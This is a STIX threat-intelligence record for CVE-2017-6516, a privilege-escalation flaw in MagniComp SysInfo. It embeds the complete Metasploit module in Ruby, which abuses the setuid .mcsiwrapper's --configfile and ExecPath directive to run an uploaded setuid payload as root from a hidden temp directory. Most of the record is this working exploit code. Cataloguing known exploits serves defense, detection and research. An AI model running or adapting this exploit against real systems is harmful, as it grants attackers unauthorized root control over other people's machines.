{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--aef59915-c052-4806-8612-4668207ac28a",
    "created": "2024-08-14T17:07:11.718196Z",
    "modified": "2024-08-14T17:07:11.7182Z",
    "name": "MagniComp SysInfo mcsiwrapper Privilege Escalation",
    "description": " This module attempts to gain root privileges on systems running MagniComp SysInfo versions prior to 10-H64.  The .mcsiwrapper suid executable allows loading a config file using the '--configfile' argument. The 'ExecPath' config directive is used to set the executable load path. This module abuses this functionality to set the load path resulting in execution of arbitrary code as root.  This module has been tested successfully with SysInfo version 10-H63 on Fedora 20 x86_64, 10-H32 on Fedora 27 x86_64, 10-H10 on Debian 8 x86_64, and 10-GA on Solaris 10u11 x86.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc.rb",
            "external_id": "magnicomp_sysinfo_mcsiwrapper_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-6516"
        },
        {
            "source_name": "reference",
            "url": "http://www.magnicomp.com/support/cve/CVE-2017-6516.shtml"
        },
        {
            "source_name": "reference",
            "url": "https://labs.mwrinfosecurity.com/advisories/magnicomps-sysinfo-root-setuid-local-privilege-escalation-vulnerability/"
        },
        {
            "source_name": "reference",
            "url": "https://labs.mwrinfosecurity.com/advisories/multiple-vulnerabilities-in-magnicomps-sysinfo-root-setuid/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MagniComp SysInfo mcsiwrapper Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges on systems running\n          MagniComp SysInfo versions prior to 10-H64.\n\n          The .mcsiwrapper suid executable allows loading a config file using the\n          '--configfile' argument. The 'ExecPath' config directive is used to set\n          the executable load path. This module abuses this functionality to set\n          the load path resulting in execution of arbitrary code as root.\n\n          This module has been tested successfully with SysInfo version\n          10-H63 on Fedora 20 x86_64, 10-H32 on Fedora 27 x86_64, 10-H10 on\n          Debian 8 x86_64, and 10-GA on Solaris 10u11 x86.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Daniel Lawson', # Discovery and exploit\n          'Romain Trouve', # Discovery and exploit\n          'bcoles' # Metasploit\n        ],\n        'DisclosureDate' => '2016-09-23',\n        'Platform' => %w[linux solaris],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [\n          [ 'Automatic', {} ],\n          [ 'Solaris', { 'Platform' => 'solaris', 'Arch' => ARCH_X86 } ],\n          [ 'Linux', { 'Platform' => 'linux', 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]\n        ],\n        'References' => [\n          [ 'CVE', '2017-6516' ],\n          [ 'BID', '96934' ],\n          [ 'URL', 'http://www.magnicomp.com/support/cve/CVE-2017-6516.shtml' ],\n          [ 'URL', 'https://labs.mwrinfosecurity.com/advisories/magnicomps-sysinfo-root-setuid-local-privilege-escalation-vulnerability/' ],\n          [ 'URL', 'https://labs.mwrinfosecurity.com/advisories/multiple-vulnerabilities-in-magnicomps-sysinfo-root-setuid/' ]\n        ],\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n    register_options([\n      OptString.new('SYSINFO_DIR', [ true, 'Path to SysInfo directory', '/opt/sysinfo' ]),\n    ])\n    register_advanced_options([\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ])\n  end\n\n  def sysinfo_dir\n    datastore['SYSINFO_DIR']\n  end\n\n  def check\n    return CheckCode::Safe(\"Directory '#{sysinfo_dir}' does not exist\") unless directory?(sysinfo_dir)\n\n    vprint_good \"Directory '#{sysinfo_dir}' exists\"\n\n    mcsiwrapper_path = \"#{sysinfo_dir}/bin/.mcsiwrapper\"\n    return CheckCode::Safe(\"#{mcsiwrapper_path} is not setuid\") unless setuid?(mcsiwrapper_path)\n\n    vprint_good(\"#{mcsiwrapper_path} is setuid\")\n\n    bash_path = cmd_exec('which bash')\n    return CheckCode::Safe('bash is not installed. Exploitation will fail.') unless bash_path.start_with?('/') && bash_path.include?('bash')\n\n    vprint_good('bash is installed')\n\n    config_version = cmd_exec(\"grep ProdVersion= #{sysinfo_dir}/config/mcsysinfo.cfg\")\n    version = config_version.scan(/^ProdVersion=(\\d+-H\\d+|\\d+-GA)$/).flatten.first\n    return CheckCode::Detected('Could not determine the SysInfo version') if version.blank?\n    return CheckCode::Safe(\"SysInfo version #{version} is not vulnerable\") if Rex::Version.new(version.sub('-H', '.')) >= Rex::Version.new('10.64')\n\n    CheckCode::Appears(\"SysInfo version #{version} is vulnerable\")\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f(path)\n    write_file(path, data)\n    register_file_for_cleanup(path)\n  end\n\n  def exploit\n    # Set target\n    uname = cmd_exec('uname')\n    vprint_status(\"Operating system is #{uname}\")\n    if target.name.eql? 'Automatic'\n      case uname\n      when /SunOS/i\n        my_target = targets[1]\n      when /Linux/i\n        my_target = targets[2]\n      else\n        fail_with(Failure::NoTarget, 'Unable to automatically select a target')\n      end\n    else\n      my_target = target\n    end\n    print_status(\"Using target: #{my_target.name}\")\n\n    # Check payload\n    if (my_target['Platform'].eql?('linux') && payload_instance.name !~ /linux/i) ||\n       (my_target['Platform'].eql?('solaris') && payload_instance.name !~ /solaris/i)\n      fail_with(Failure::BadConfig, \"Selected payload '#{payload_instance.name}' is not compatible with target operating system '#{my_target.name}'\")\n    end\n\n    # Create a working directory\n    base_path = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric(5..10)}\"\n    mkdir(base_path)\n\n    # Write config file\n    config_path = \"#{base_path}/#{rand_text_alphanumeric(5..10)}\"\n    upload(config_path, \"ExecPath=#{base_path}\")\n\n    # Upload payload\n    payload_name = rand_text_alphanumeric(5..10)\n    payload_path = \"#{base_path}/#{payload_name}\"\n    upload(payload_path, generate_payload_exe)\n    cmd_exec(\"chmod u+sx '#{payload_path}'\")\n\n    print_status('Executing payload...')\n\n    # Executing .mcsiwrapper directly errors:\n    #   Command \".mcsiwrapper\" cannot start with `.' or contain `/'.\n    # Instead, we execute with bash to replace ARGV[0] with the payload file name\n    output = cmd_exec(\"bash -c \\\"exec -a #{payload_name} #{sysinfo_dir}/bin/.mcsiwrapper --configfile #{config_path}&\\\"\")\n    output.each_line { |line| vprint_status line.chomp }\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-09-23",
    "x_mitre_platforms": [
        "%w[linux solaris]"
    ]
}